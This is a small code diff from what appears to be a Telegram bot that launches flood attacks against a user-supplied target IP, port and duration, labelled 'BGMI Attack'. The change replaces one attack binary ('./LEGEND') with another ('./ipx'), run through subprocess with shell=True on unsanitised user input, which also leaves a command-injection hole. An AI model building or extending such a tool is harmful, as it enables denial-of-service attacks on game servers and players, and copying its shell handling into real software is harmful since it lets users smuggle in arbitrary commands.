@@ -161,7 +161,7 @@ def handle_bgmi(message):
                         record_command_logs(user_id, '/bgmi', target, port, time)
                         log_command(user_id, target, port, time)
                         start_attack_reply(message, target, port, time)
-                        full_command = f"./LEGEND {target} {port} {time} 2000"
+                        full_command = f"./ipx {target} {port} {time}"
                         subprocess.run(full_command, shell=True)
                         response = f"🎮BGMI Attack Finished🎮 Target: {target} Port: {port} Time: {time}"
                 except ValueError:
